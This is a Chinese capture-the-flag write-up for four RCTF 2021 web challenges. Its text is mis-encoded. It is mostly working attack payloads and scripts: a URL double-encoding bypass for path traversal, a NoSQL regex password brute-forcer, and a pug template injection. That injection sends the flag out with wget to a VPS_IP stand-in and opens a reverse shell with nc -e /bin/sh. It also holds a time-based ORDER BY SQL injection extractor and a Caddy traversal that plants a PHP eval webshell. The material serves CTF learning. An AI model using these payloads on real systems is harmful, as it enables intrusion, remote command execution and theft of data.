# RCTF 2021

## Easyphp

> *2021/10/20*

### é¢˜ç›®

è¿™é“é¢˜ç»™äº†æºç ï¼Œä¸€ä¸ª **Nginx** çš„æœåŠ¡å™¨ï¼Œ`flight`æ¡†æ¶çš„ä»£ç ï¼Œ

#### `Nginx.conf`

```nginx
server {
    listen       80;
    listen  [::]:80;
    server_name  localhost;

    #access_log  /var/log/nginx/host.access.log  main;
    root   /var/www/html;
    location /admin {
        allow 127.0.0.1;
        deny all;
    }
    location / {
        index  index.php;
        try_files $uri @phpfpm;
    }

    #error_page  404              /404.html;

    # redirect server error pages to the static page /50x.html
    #
    error_page   500 502 503 504  /50x.html;
    location = /50x.html {
        root   /usr/share/nginx/html;
    }

    # proxy the PHP scripts to Apache listening on 127.0.0.1:80
    #
    #location ~ \.php$ {
    #    proxy_pass   http://127.0.0.1;
    #}

    # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000
    #
    location @phpfpm {
        include        fastcgi_params;
        fastcgi_split_path_info ^(.+?\.php)(/.*)$;
        fastcgi_pass   php:9000;
        fastcgi_index  index.php;
        fastcgi_param  SCRIPT_FILENAME  $document_root/index.php;
        fastcgi_param  REQUEST_URI  $uri;
    }

    # deny access to .htaccess files, if Apache's document root
    # concurs with nginx's one
    #
    #location ~ /\.ht {
    #    deny  all;
    #}
}
```

è¿™ä¸ªé…ç½®æ–‡ä»¶ä¸»è¦å°±æ˜¯è®°å½•äº†æœåŠ¡å™¨çš„é…ç½®é—®é¢˜ï¼Œ`location`è¿™é‡Œå°±æ˜¯æ¥å—`/`å’Œ`/admin`ï¼Œä½†æ˜¯`/admin`ä¼šè¿‡æ»¤æ‰é`localhost`è¯·æ±‚çš„ç”±`/`çš„é€»è¾‘è§£æï¼Œè€Œ`/`ä¸­ï¼Œå¦‚æœä»€ä¹ˆè¯·æ±‚éƒ½ä¸å¸¦ï¼Œå°±è¿›å…¥`index.php`ï¼›è€Œ`try_files`è¯­å¥çš„ä¸»è¦ä½œç”¨å°±æ˜¯æŒ‰ç…§é¡ºåºæŸ¥æ‰¾å­˜åœ¨çš„æ–‡ä»¶ï¼Œè€Œè¿™é‡Œå°±æ˜¯å…ˆçœ‹`$uri`ä¸­æ˜¯å¦å­˜åœ¨è¿™ä¸ªæ–‡ä»¶ï¼Œä¸å­˜åœ¨çš„è¯å°±è¿›å…¥`phpfpm`ä¸­ï¼Œè€Œè¿™ä¸ªç¯å¢ƒé‡Œæ²¡åˆ«çš„`$uri`æ–‡ä»¶ï¼Œæ‰€ä»¥å°±æ˜¯åˆ°`phpfpm`è¿™ä¸ªé€»è¾‘é‡Œï¼Œè¿™é‡Œæ¥å—ä¸¤ä¸ªå‚æ•°`SCRIPT_FILENAME`å’Œ`REQUEST_URI`ï¼Œå‰è€…å°±æ˜¯fpmæ‰§è¡Œ`index.php`ï¼Œåè€…å°±æ˜¯ **Nginx** è§£æ`$uri`å˜é‡

#### `flight`æ¡†æ¶

```php
// index.php
function isdanger($v){
    if(is_array($v)){
        foreach($v as $k=>$value){
            if(isdanger($k)||isdanger($value)){
                return true;
            }
        }
    }else{
        if(strpos($v,"../")!==false){
            return true;
        }
    }
    return false;
}

$app->before("start",function(){
    foreach([$_GET,$_POST,$_COOKIE,$_FILES] as $value){
        if(isdanger($value)){
            die("go away hack");
        }
    }
});
$app->route('/*', function(){
    global $app;
    $request = $app->request();
    $app->render("head",[],"head_content");
    if(stristr($request->url,"login")!==FALSE){
        return true;
    }else{
        if($_SESSION["user"]){
            return true;
        }
        $app->redirect("/login");
    }

});

$app->route('/admin', function(){
    global $app;
    $request = $app->request();
    $app->render("admin",["data"=>"./".$request->query->data],"body_content");
    $app->render("template",[]);
});

$app->route("POST /login",function(){
    global $username,$password,$app;
    $request  = $app->request();
    if($request->data->username === $username && $request->data->password === $password){
        $_SESSION["user"] = $username;
        $app->redirect("/");
        return;
    }
    $app->redirect("/login?fail=1");
});
```

æ¡†æ¶é¦–å…ˆé˜Ÿå‚æ•°è¿›è¡Œäº†è¿‡æ»¤ï¼Œé˜²å¾¡äº†è·¯å¾„ç©¿è¶Šï¼Œç„¶åæ˜¯å‡ ä¸ªè·¯ç”±ï¼Œ`/login`æƒ³è¦ç™»å½•ï¼Œå¿…é¡»æ˜¯å¼ºç­‰äºï¼Œè€Œ`/admin`ä¼šæ¥å—ä¸€ä¸ª`data`å‚æ•°ï¼Œæ‹¼æ¥ä¸€ä¸ª`./`è¿›è¡Œæ¨¡æ¿æ¸²æŸ“

è€Œæ¨¡æ¿æ¸²æŸ“ä¸­ï¼Œ`admin.php`å¦‚ä¸‹

```php+HTML
<h3>File List:</h3>
<script>
</script>
<div class="bg-light border rounded-3" style="white-space: pre-line">
    <?php
        $dir = pathinfo($data?$data:".",PATHINFO_DIRNAME);
        foreach(scandir($dir) as $v){
            echo "<a href=\"/admin?data=$dir/$v\">$v</a><br />";
        }
    ?>
</div>
<?php if ($data) { ?><h3><?= $data . ":" ?></h3>
    <div class="bg-light border rounded-3"><code style="white-space: pre-line"><?php echo file_get_contents($data); ?></code></div><?php } ?>
```

å¾ˆæ˜æ˜¾æœ‰ä¸€ä¸ªæ–‡ä»¶åŒ…å«ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„æ€è·¯å°±æ˜¯æƒ³åŠæ³•è¿›å…¥çš„`/admin`ä¸­ä¼ é€’å‚æ•°ï¼Œé¦–å…ˆçœ‹æ¡†æ¶ä¸­è·¯ç”±çš„ç›¸å…³ä»£ç `/net/Router.php`

```php
<?php
    public function route(Request $request) {
        $url_decoded = urldecode( $request->url );
        while ($route = $this->current()) {
            if ($route !== false && $route->matchMethod($request->method) && $route->matchUrl($url_decoded, $this->case_sensitive)) {
                return $route;
            }
            $this->next();
        }

        return false;
    }
}
```

`route`å‡½æ•°ï¼Œé¦–å…ˆä¼šå¯¹urlè¿›è¡Œä¸€æ¬¡è§£ç ï¼Œè€Œè¿™ä¸ªurlæ¥è‡ª`$request->url`æ¥è‡ªäº`Request.php`ï¼Œè¿™é‡Œä¼šå°†`SCRIPT_NAME`çš„æœ€å‰é¢æˆªæ‰

```php
<?php
    public function __construct($config = array()) {
        // Default properties
        if (empty($config)) {
            $config = array(
                'url' => str_replace('@', '%40', self::getVar('REQUEST_URI', '/')),
                'base' => str_replace(array('\\',' '), array('/','%20'), dirname(self::getVar('SCRIPT_NAME'))),
                'method' => self::getMethod(),
                'referrer' => self::getVar('HTTP_REFERER'),
                'ip' => self::getVar('REMOTE_ADDR'),
                'ajax' => self::getVar('HTTP_X_REQUESTED_WITH') == 'XMLHttpRequest',
                'scheme' => self::getScheme(),
                'user_agent' => self::getVar('HTTP_USER_AGENT'),
                'type' => self::getVar('CONTENT_TYPE'),
                'length' => self::getVar('CONTENT_LENGTH', 0),
                'query' => new Collection($_GET),
                'data' => new Collection($_POST),
                'cookies' => new Collection($_COOKIE),
                'files' => new Collection($_FILES),
                'secure' => self::getScheme() == 'https',
                'accept' => self::getVar('HTTP_ACCEPT'),
                'proxy_ip' => self::getProxyIpAddress(),
                'host' => self::getVar('HTTP_HOST'),
            );
        }

        $this->init($config);
    }

    /**
     * Initialize request properties.
     *
     * @param array $properties Array of request properties
     */
    public function init($properties = array()) {
        // Set all the defined properties
        foreach ($properties as $name => $value) {
            $this->$name = $value;
        }

        // Get the requested URL without the base directory
        if ($this->base != '/' && strlen($this->base) > 0 && strpos($this->url, $this->base) === 0) {
            $this->url = substr($this->url, strlen($this->base));
        }

        // Default url
        if (empty($this->url)) {
            $this->url = '/';
        }
        // Merge URL query parameters with $_GET
        else {
            $_GET += self::parseQuery($this->url);

            $this->query->setData($_GET);
        }

        // Check for JSON input
        if (strpos($this->type, 'application/json') === 0) {
            $body = $this->getBody();
            if ($body != '') {
                $data = json_decode($body, true);
                if (is_array($data)) {
                    $this->data->setData($data);
                }
            }
        }
    }
```

è€Œ`Route.php`é‡Œå°±æ˜¯æœ€ååŒ¹é…urlçš„å‡½æ•°

```php
<?php
    public function matchUrl($url, $case_sensitive = false) {
        // Wildcard or exact match
        if ($this->pattern === '*' || $this->pattern === $url) {
            return true;
        }

        $ids = array();
        $last_char = substr($this->pattern, -1);

        // Get splat
        if ($last_char === '*') {
            $n = 0;
            $len = strlen($url);
            $count = substr_count($this->pattern, '/');

            for ($i = 0; $i < $len; $i++) {
                if ($url[$i] == '/') $n++;
                if ($n == $count) break;
            }

            $this->splat = (string)substr($url, $i+1);
        }

        // Build the regex for matching
        $regex = str_replace(array(')','/*'), array(')?','(/?|/.*?)'), $this->pattern);

        $regex = preg_replace_callback(
            '#@([\w]+)(:([^/\(\)]*))?#',
            function($matches) use (&$ids) {
                $ids[$matches[1]] = null;
                if (isset($matches[3])) {
                    return '(?P<'.$matches[1].'>'.$matches[3].')';
                }
                return '(?P<'.$matches[1].'>[^/\?]+)';
            },
            $regex
        );

        // Fix trailing slash
        if ($last_char === '/') {
            $regex .= '?';
        }
        // Allow trailing slash
        else {
            $regex .= '/?';
        }

        // Attempt to match route and named parameters
        if (preg_match('#^'.$regex.'(?:\?.*)?$#'.(($case_sensitive) ? '' : 'i'), $url, $matches)) {
            foreach ($ids as $k => $v) {
                $this->params[$k] = (array_key_exists($k, $matches)) ? urldecode($matches[$k]) : null;
            }

            $this->regex = $regex;

            return true;
        }

        return false;
    }
```

`pattern`æ˜¯`/admin`çš„æ—¶å€™å…¶ä¸­çš„æ­£åˆ™è¡¨è¾¾å¼ä¸º`#^/admin/?(?:\\?.*)?$#i`ï¼Œå³ä¸ºæ­£åˆ™è¡¨è¾¾å¼ä¸º`^/admin/?(?:\?.*)?$`ï¼Œå¿½ç•¥å¤§å°å†™ï¼Œè€Œè¿™é‡Œæˆ‘ä»¬é‡‡ç”¨`/admin%3flogin`è¿™ç§è·¯å¾„ï¼Œåœ¨è¿™é‡Œå°±ä¼šå˜æˆ`/admin?login`è¿™æ ·çš„å­—ç¬¦ï¼Œä¸”èƒ½è¢«æ­£ç¡®åŒ¹é…åˆ°`/admin`è·¯ç”±ä¸Šï¼Œè¿™æ ·å°±ç›¸å½“äºæˆ‘ä»¬æ‹¿åˆ°äº†adminæƒé™

> `fastcgi_param REQUEST_URI $uri;`ï¼Œä½œç”¨ä¸ºåœ¨å‘fastcgiä¼ é€’ä¸€ä¸ª`REQUEST_URI`å‚æ•°ï¼Œè€Œè¯¥å‚æ•°æ˜¯è¢«nginxè§£æè¿‡çš„`$uri`å˜é‡ï¼Œè¯¥å˜é‡ä»…åŒ…æ‹¬è·¯å¾„ï¼Œ**ä¸åŒ…æ‹¬query_string**ã€‚è€Œurlæ¥è‡ª`REQUEST_URI`ï¼Œå°±æ˜¯è¿™ä¸ªnginxçš„`$uri`å˜é‡ï¼Œä¸åŒ…å«`query_string`ï¼Œè¿™æ ·å­åç«¯æ”¶åˆ°çš„å†…å®¹å°±æ˜¯`/vme/admin`ï¼Œå¹¶æ²¡æœ‰`login`å­—ç¬¦ï¼Œè€Œæ ¹æ®`index.php`ä¸­çš„é€»è¾‘ï¼Œæ²¡æœ‰`login`çš„è¯ä¼šè¢«æ¡†æ¶é‡å®šå‘åˆ°`/login`ä¸‹

è€Œæˆ‘ä»¬åªéœ€è¦æäº¤`data`å‚æ•°å°±å¯ä»¥äº†ï¼Œä½†æ˜¯éœ€è¦ç»•è¿‡å¯¹`../`çš„è¿‡æ»¤

```php
<?php
    public static function parseQuery($url) {
        $params = array();

        $args = parse_url($url);
        if (isset($args['query'])) {
            parse_str($args['query'], $params);
        }

        return $params;
    }
```

ä¸‹é¢çš„ä»£ç å…¶å®å¾ˆå¥½åˆ¤æ–­ï¼Œç”±äºç”¨äº†`parse_url`å’Œ`parse_str`ï¼Œæˆ‘ä»¬å¯ä»¥å¯¹åé¢è¿›è¡Œä¸¤æ¬¡urlç¼–ç å°±å¯ä»¥ç»•è¿‡

ä½†æ˜¯è¿™é‡Œä¼¼ä¹è¿˜æ˜¯æœ‰å“ªé‡Œä¸å¤ªå¯¹ï¼Œå› ä¸ºURLæ˜¯æ”¶çš„nginxè½¬å‘è¿‡æ¥çš„REQUEST_URIï¼Œæˆ‘ä»¬å¦‚æœä½¿ç”¨`%3f`å»è®©nginxè®¤ä¸º`/aa/admin%3flogin`æ˜¯ä¸€ä¸ªå®Œæ•´çš„urlï¼Œé‚£ä¹ˆnginxåœ¨å’Œfpmé€šä¿¡æ—¶ï¼Œç†è®ºä¸Šæ˜¯ä¸ä¼šè§£ç è¿™ä¸ªæ•°æ®çš„ï¼Œé‚£ä¹ˆåç«¯æ”¶åˆ°çš„urlä¹Ÿåº”è¯¥æ˜¯`/aa/admin%3flogin`ï¼Œè€Œåœ¨routeçš„æ—¶å€™å› ä¸ºè¿›è¡Œäº†urlè§£ç ï¼Œæ‰€ä»¥èƒ½æ­£ç¡®è§£æï¼Œä½†å‚æ•°è§£ææ—¶å¹¶ä¸ä¼šè¿›è¡Œurlè§£ç ï¼Œé‚£ä¹ˆ`%3f`åé¢çš„å†…å®¹ä¹Ÿå°±ä¸ä¼šè¢«parse_urlæ”¾åˆ°`$args['query']`ä¸­å»ï¼Œä¹Ÿå°±ä¸ä¼šç»å†ç¬¬äºŒæ¬¡è§£ç æ‰å¯¹

> è¿™é¢˜çš„æ¼æ´ç‚¹åœ¨äºï¼Œå„ç§é¢å¤–çš„urldecodeã€‚`REQUEST_URI` æ¥è‡ª `$uri`, `$uri` æ˜¯æ²¡æœ‰ç»è¿‡urldecodeçš„. PHP-FPM å›å¯¹æ”¶åˆ°çš„`REQUEST_URI`è¿›è¡Œurldecode

ç»¼ä¸Šï¼Œè¯¥é¢˜ç›®çš„ä¸¤ç§payloadéƒ½æ˜¯ä¸ºäº†ä½¿ç”¨`$uri`ï¼Œä¸€ç§æ˜¯é€šè¿‡é˜¶æ®µç»•è¿‡`/admin`ï¼Œä¸€ç§æ˜¯é€šè¿‡ç¼–ç 

### payload

```
/%2561%2564%256d%2569%256e%3flogin=123%26data=..%252f..%252f..%252f..%252fflag
/aa/admin%3flogin&data=..%252f..%252f..%252f..%252fflag
```

## CandyShop

>*2021/10/20*

### é¢˜ç›®

> **è¯¥é¢˜ç›®åŸé¢˜ä¸githubä¸Šçš„é¢˜ç›®ä»£ç ç•¥æœ‰å‡ºå…¥**

è¿™é“é¢˜æ˜¯ä¸€é“ `Nodejs`çš„é¢˜ï¼Œè¿›å»æ˜¯ä¸€ä¸ªå¾ˆç®€å•çš„é¡µé¢

![ractf20211](img/rctf2021/rctf20211.png)

ä»£ç å¦‚ä¸‹

```javascript
//user.js
router.post('/login', async (req, res) => {
    let {username, password} = req.body
    let rec = await db.Users.find({username: username, password: password})
    if (rec) {
        if (rec.username === username && rec.password === password) {
            res.cookie('token', rec, {signed: true})
            res.redirect('/shop')
        } else {
            res.render('login', {error: 'You Bad Bad >_<'})
        }
    } else {
        res.render('login', {error: 'Login Failed!'})
    }
})

router.post('/register', async (req, res) => {
    let {username, password} = req.body
    if (typeof(username) !== 'string')
        return res.status(400)
    let rec = await db.Users.find({username: username})
    if (rec)
        return res.render('register', {error: 'Duplicate User!'})
    await db.Users.add(username, password, false)
    return res.redirect('/user/login')
})

//db.js
users.deleteMany(err => {
    if (err) {
        console.log(err)
    } else {
        users.insertOne({
            username: 'rabbit',
            password: process.env.PASSWORD,
            active: true
        })
    }
})
```

ç»“åˆ`db.js`å’Œ`user.js`ï¼Œæ¥çœ‹ç”¨æˆ·åœ¨æ³¨å†Œæ—¶ç”Ÿæˆçš„ç”¨æˆ·éƒ½æ˜¯ä¸æ´»è·ƒçš„ç”¨æˆ·ï¼Œå³`active:false`ï¼Œä½†æ˜¯ï¼Œåœ¨æ•°æ®åº“é‡Œäº‹å…ˆç”Ÿæˆäº†ä¸€ä¸ª`rabbit`ç”¨æˆ·ï¼Œä½†æ˜¯å¯†ç æ˜¯çº¯éšæœºçš„ã€‚ä½†æ˜¯è¯¥é¡µé¢å­˜åœ¨`nosql`æ³¨å…¥ï¼Œåœ¨`/login`è·¯å¾„ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥çˆ†ç ´`rabbit`ç”¨æˆ·çš„å¯†ç 

```javascript
// shop.js
const checkLogin = (req, res, next) => {
    if (req.signedCookies.token)
        next()
    else
        res.render('error', {error: 'You must login!'})
}

const checkActive = (req, res, next) => {
    if (req.signedCookies.token.active)
        next()
    else
        res.render('error', {error: 'Your account is not active!'})
}


router.get('/', checkLogin, async (req, res) => {
    let candies = await db.Candies.list()
    res.render('shop', {candies: candies})
})

router.get('/order', checkLogin, checkActive, async (req, res) => {
    let {id} = req.query
    let candy = await db.Candies.find({id: id})
    res.render('order', {user_name: req.signedCookies.token.username, candy: candy})
})

router.post('/order', checkLogin, checkActive, async (req, res) => {
    let {user_name, candy_name, address} = req.body

    res.render('confirm', {
        user_name: user_name,
        candy_name: candy_name,
        address: pug.render(address)
    })
})
```

è¯¥é¡µé¢ä¸»è¦å¤„ç†ç™»é™†åé¢çš„é€»è¾‘ï¼Œæˆ‘ä»¬ä¹‹å‰å·²ç»å¾—åˆ°äº†`rabbit`ç”¨æˆ·ï¼Œå¯ä»¥ç›´æ¥è¿›å…¥`/order`è·¯å¾„ä¸‹ï¼Œè¯¥é€»è¾‘ä¼šå°†`address`å¯¼å…¥åˆ°`confirm.pug`è¿™ä¸ªé¡µé¢

```java
extends layout


block content
    .container
        .row.justify-content-center
            .col-6.mt-5
                .card
                    .card-header.text-center.font-weight-bold(style='background-color: pink;color: white') Confirm Your Order
                    .card-body
                    form(action='/shop/confirm' method='POST')
                        .form-group.row
                            label.col-form-label.text-md-right.col-4(for='user_name') User Name
                            .col-6
                                input#user_name.form-control(type='text' name='user_name' value=user_name readonly)
                        .form-group.row
                            label.col-form-label.text-md-right.col-4(for='candy_name') Candy Name
                            .col-6
                                input#candy_name.form-control(type='text' name='candy_name' value=candy_name readonly)
                        .form-group.row
                            label.col-form-label.text-md-right.col-4(for='address') Address
                            .col-6
                                input#address.form-control(type='text' name='address' value='123' readonly)
                                #{console.log(global.process.mainModule.require("child_process").execSync("wget -q -O- VPS_IP/`cat /flag`").toString())}
                                //input#address.form-control(type='text' name='address' value='123')
                        if error
                            .alert.alert-danger.mx-5(role='alert') #{error}
                    .row.justify-content-center
                        .col-6
                            a(href='/shop/thanks')
                                button.btn.btn-primary.btn-block(type='submit') Yes
                        .col-6
                            a(href='/shop')
                                button.btn.btn-primary.btn-block No
```

è€Œåœ¨è¿™ä¸ªé¡µé¢ä¸‹å­˜åœ¨ç€`pug`æ¨¡æ¿æ³¨å…¥ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯`github`çš„ä»£ç å’Œæ¯”èµ›ç¯å¢ƒå·®è·å°±åœ¨`address`å˜é‡ï¼Œä¸€ä¸ªæ˜¯å­—ç¬¦å‹ï¼Œä¸€ä¸ªæ˜¯å˜é‡ï¼Œè¦æ³¨æ„

### payload

```python
import requests
import time
import string

url = "http://127.0.0.1:3000/user/login"
password = ""
#charset = string.ascii_letters + string.punctuation
charset = string.printable

for i in range(64):
    for s in charset:
        data = {
            "username": "rabbit",
            "password[$regex]": f"^{re.escape(password + s)}"
        }
        #print(s)
        res = requests.post(url, data)
        if "You Bad Bad" in res.text:
            password += s
            print(password)
            break
```

```
user_name=rabbit&candy_name=bunny_candy&address=123 readonly)%0a                                #{console.log(global.process.mainModule.require("child_process").execSync("nc 192.168.232.1 9999 -e /bin/sh").toString('UTF-8'))}%0a                                input#address.form-control(type='text' name='address' value='123')
```

## EasySQLi

>  *2021/10/20*

### é¢˜ç›®

è¿™é“é¢˜ç»™äº†æºä»£ç 

```php
<?php
require_once('db.php');
highlight_file(__FILE__);

set_time_limit(1);
$s = floatval(microtime());

$order = $_GET['order'] ?? 1;
$sql = "SELECT CONCAT('RCTF{',USER(),'}') AS FLAG WHERE 'ğŸ¬å…³æ³¨å˜‰ç„¶ğŸ¬' = 'ğŸ¬é¡¿é¡¿è§£é¦‹ğŸ¬' OR 'ğŸ¬Watch Diana a dayğŸ¬' = 'ğŸ¬Keep hunger awayğŸ¬' OR 'ğŸ¬å˜‰ç„¶ã«æ³¨ç›®ã—ã¦ğŸ¬' = 'ğŸ¬é£Ÿæ¬²ã‚’ããã‚‹ğŸ¬' ORDER BY $order;";

$stm = $pdo->prepare($sql);
$stm->execute();
echo "Count {$stm->rowCount()}.";

usleep((1 + floatval(microtime()) - $s) * 1e6);
```

`set_time_limit`å‡½æ•°ä¼šé™åˆ¶é¡µé¢æ‰§è¡Œæ—¶é—´åœ¨1sï¼Œåé¢çš„`usleep`ä¼šè®©é¡µé¢ç¨³å®šå»¶è¿Ÿåœ¨1sï¼Œ`SQL`è¯­å¥ç”¨äº†é¢„ç¼–è¯‘ï¼Œä½†æ˜¯å‚æ•°å´æ˜¯åœ¨`order by`åé¢ï¼Œæ‰€ä»¥æ ¹æœ¬æ²¡å½±å“ï¼Œè¿˜æ˜¯å¯ä»¥æ³¨å…¥.

è€Œ`set_time_limit`å‡½æ•°æœ‰è¿™æ ·çš„é™åˆ¶

> *Note:
> The set_time_limit() function and the configuration directive max_execution_time only affect the execution time of the script itself. Any time spent on activity that happens outside the execution of the script such as system calls using system(), stream operations, database queries, etc. is not included when determining the maximum time that the script has been running. This is not true on Windows where the measured time is real.*

ä¹Ÿå°±æ˜¯è¯´SQLæœ¬èº«çš„å»¶æ—¶å¹¶ä¸åœ¨è¿™ä¸ªè®¡æ—¶èŒƒå›´å†…ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦è®©`SQL`è¯­å¥ä¹Ÿå»¶æ—¶ï¼Œæ‰èƒ½æ”»å‡»æˆåŠŸï¼Œä½†æ˜¯å¸¸è§„çš„`sleep`ä¼šè¢«ä¼˜åŒ–æ‰ï¼Œéœ€è¦è®©`SQL`åšä¸€äº›è€—æ—¶é—´çš„å·¥ä½œï¼Œè¾¾åˆ°å»¶è¿Ÿçš„æ•ˆæœ

#### `repeat`

```sql
SELECT
    CONCAT( 'RCTF{', USER (), '}' ) AS FLAG 
WHERE
    'ğŸ¬å…³æ³¨å˜‰ç„¶ğŸ¬' = 'ğŸ¬é¡¿é¡¿è§£é¦‹ğŸ¬' OR 'ğŸ¬Watch Diana a dayğŸ¬' = 'ğŸ¬Keep hunger awayğŸ¬' OR 'ğŸ¬å˜‰ç„¶ã«æ³¨ç›®ã—ã¦ğŸ¬' = 'ğŸ¬é£Ÿæ¬²ã‚’ããã‚‹ğŸ¬' 
ORDER BY
(
    updatexml (1,
        IF(
            ASCII(SUBSTR((SELECT USER()), 1, 1 )) = 65,
            CONCAT(REPEAT('a', 40000000), REPEAT('a', 40000000), REPEAT('a', 40000000), REPEAT('a', 40000000), REPEAT('b', 10000000)),
            1
        ),
        1
    ) 
)
```

#### `hex`

```sql
SELECT
    CONCAT( 'RCTF{', USER (), '}' ) AS FLAG 
WHERE
    'ğŸ¬å…³æ³¨å˜‰ç„¶ğŸ¬' = 'ğŸ¬é¡¿é¡¿è§£é¦‹ğŸ¬' OR 'ğŸ¬Watch Diana a dayğŸ¬' = 'ğŸ¬Keep hunger awayğŸ¬' OR 'ğŸ¬å˜‰ç„¶ã«æ³¨ç›®ã—ã¦ğŸ¬' = 'ğŸ¬é£Ÿæ¬²ã‚’ããã‚‹ğŸ¬' 
ORDER BY
(
    updatexml (1,
        concat(
            '~',
            (
                if(
                    (substr(hex(user()), 1, 1)='A'),
                    (select length(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex(hex('1')))))))))))))))))))))))))))))))),
                    'a'
                )
            ),
            1
        ),
        1
    )
)
```

#### `redos`

```sql
SELECT
    CONCAT( 'RCTF{', USER (), '}' ) AS FLAG 
WHERE
    'ğŸ¬å…³æ³¨å˜‰ç„¶ğŸ¬' = 'ğŸ¬é¡¿é¡¿è§£é¦‹ğŸ¬' OR 'ğŸ¬Watch Diana a dayğŸ¬' = 'ğŸ¬Keep hunger awayğŸ¬' OR 'ğŸ¬å˜‰ç„¶ã«æ³¨ç›®ã—ã¦ğŸ¬' = 'ğŸ¬é£Ÿæ¬²ã‚’ããã‚‹ğŸ¬' 
ORDER BY
(
    SELECT 1 WHERE
        IF(
            ASCII(SUBSTR(USER(), 1, 1 )) = 65,
            REPEAT('a', 100),
            'a'
        )
        RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b' 
)
```

### payload

```python
# -*- coding:utf8 -*-
import requests
import string

flag = ''
select = 'select/**/user()'
url = "http://127.0.0.1:11002/?order="
for j in range(1, 66):
    for i in string.printable:
        #payload="updatexml(1,if(substr(({}),{},1)='{}',repeat('a',40000000),0),1)".format(select, j, i)
        payload = "updatexml(1,if(ascii(substr(({}),{},1))='{}',concat(repeat('a',40000000),repeat('a',40000000),repeat('a',40000000),repeat('a',40000000),repeat('b',10000000)),1),1)".format(select, j, ord(i))
        url1 = url + payload
        req = requests.get(url1)
        #print(req.elapsed.total_seconds())
        #print(payload)
        if req.elapsed.total_seconds() > 1.4:
            flag += i
            print(payload)
            print(flag)
```

## VerySafe

> *2021/10/20*

### é¢˜ç›®

è¿™é“é¢˜çš„`caddy`å’Œ`Nginx`å¾ˆç›¸ä¼¼ï¼Œè¿™é‡Œä»€ä¹ˆéƒ½æ²¡ç»™ï¼Œåªæœ‰ä¸€ä¸ªç©ºç™½é¡µé¢ï¼ŒæœåŠ¡å™¨ä¸º`caddy`ï¼Œå°†æœåŠ¡éƒ½åå‘ä»£ç†åˆ°`php fpm`ä¸Š

```php
:80 {
	root * /srv
	php_fastcgi php:9000
}
```

å› ä¸ºä»€ä¹ˆéƒ½æ²¡ç»™ï¼Œæ‰€ä»¥é¦–å…ˆåªèƒ½å¯¹`caddy`çš„å†å²æ¼æ´è¿›è¡ŒæœæŸ¥ï¼Œè¯¥ç‰ˆæœ¬ä¸º`2.4.2`ï¼Œä»`github`ä¸Šå¯ä»¥æŸ¥åˆ°ï¼Œ`Caddy <= 2.4.2` åœ¨ä¼ é€’`script_path`ç»™`php-fpm`çš„æ—¶å€™å¯ä»¥ç›®å½•ç©¿è¶Šï¼Œè€Œè¿™é“é¢˜çš„å¦å¤–ä¸€ä¸ªè€ƒç‚¹å°±æ˜¯ [**åˆ©ç”¨phpè‡ªå¸¦æ–‡ä»¶è¿›è¡ŒRCE**](https://web.archive.org/web/20201022203937/https://khack40.info/camp-ctf-2015-trolol-web-write-up/)

> *åœ¨phpå®˜æ–¹æä¾›çš„phpå®¹å™¨ä¸­ register_argc_argv æ˜¯é»˜è®¤å¼€å¯çš„ï¼Œè€Œä¸”ä¹Ÿé»˜è®¤åŒ…å«peclcmd.phpï¼Œäºæ˜¯å°±å¯ä»¥åœ¨é»˜è®¤php-fpmçš„dockerå’Œcaddy<=2.4.2çš„ç¯å¢ƒä¸‹æ— æ¡ä»¶RCE*

### payload

```http
GET /../usr/local/lib/php/peclcmd.php?+config-create+/tmp/<?=eval($_POST['cmd']);?>/*+/srv/bme.php HTTP/1.1
Host: 127.0.0.1:54120
sec-ch-ua: "Chromium";v="95", ";Not A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

```http
POST /bme.php HTTP/1.1
Host: 127.0.0.1:54120
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="95", ";Not A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 24

cmd=system('/readflag');
```

## xss_it

### é¢˜ç›®

### payload

